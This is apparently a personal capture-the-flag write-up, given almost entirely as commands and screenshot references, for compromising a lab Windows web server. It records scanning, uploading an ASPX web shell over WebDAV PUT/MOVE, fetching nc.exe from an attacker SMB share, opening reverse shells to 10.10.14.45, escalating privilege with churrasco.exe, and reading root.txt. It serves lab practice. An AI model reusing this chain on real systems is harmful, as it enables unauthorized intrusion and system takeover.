# Initial Recon

## Port Scanning

```shell
nmap -p- -T4 --min-rate 10000 -sCV -oA nmap/all -vv 10.129.159.209
```

![[Pasted image 20240522131316.png]]

## Website Enumeration 

http://10.129.159.209/

![[Pasted image 20240522131026.png]]

Wappalyzer Tech Stack Scan:

![[Pasted image 20240522130903.png]]

### Subdirectory Scan

![[Pasted image 20240522131625.png]]

![[Pasted image 20240522140743.png]]

```shell
curl -X PUT http://10.129.159.209/letmein/aspx_cmd.aspx -d @aspx_cmd.aspx
```

![[Pasted image 20240522141422.png]]

```
curl -X PUT http://10.129.159.209/letmein/aspx_cmd.txt -d @aspx_cmd.aspx
```

![[Pasted image 20240522141500.png]]

![[Pasted image 20240522141524.png]]

![[Pasted image 20240522141539.png]]

```shell
curl -X MOVE http://10.129.159.209/letmein/aspx_cmd.txt -H 'Destination:http://10.129.159.209/letmein/aspx_cmd.aspx'
```

![[Pasted image 20240522141741.png]]

![[Pasted image 20240522141829.png]]

```shell
whoami

nt authority\network service
```

![[Pasted image 20240522141849.png]]

```shell
dir
```

![[Pasted image 20240522141935.png]]

```
dir \
```

![[Pasted image 20240522142123.png]]

```
mkdir \tools
```
![[Pasted image 20240522142155.png]]

```
icacls \tools
```

![[Pasted image 20240522142226.png]]

```shell
impacket-smbserver hack ./ -smb2support
```

![[Pasted image 20240522142411.png]]

```powershell
systeminfo
```

![[Pasted image 20240522142621.png]]

```
copy \\10.10.14.45\hack\nc.exe \tools\nc.exe
```

![[Pasted image 20240522142811.png]]

```powershell
dir \tools
```

![[Pasted image 20240522142835.png]]

```shell
rlwrap nc -nlvp 4444
```

![[Pasted image 20240522144251.png]]


```powershell
\tools\nc.exe 10.10.14.45 4444 -e cmd.exe
```

![[Pasted image 20240522144331.png]]

```powershell
whoami
ipconfig
```

![[Pasted image 20240522144528.png]]

```powershell
whoami /all
```

![[Pasted image 20240522144750.png]]

```powershell
systeminfo
```

![[Pasted image 20240522144823.png]]

```powershell
cd \tools
copy \\10.10.14.45\hack\churrasco.exe .
```

![[Pasted image 20240522145204.png]]

```powershell
.\churrasco.exe -d "\tools\nc.exe 10.10.14.45 5555 -e cmd.exe"
```

![[Pasted image 20240522145511.png]]

```
whoami
whoami /priv
ipconfig
type "\Documents and Settings\Administrator\Desktop\root.txt"
```

![[Pasted image 20240522145843.png]]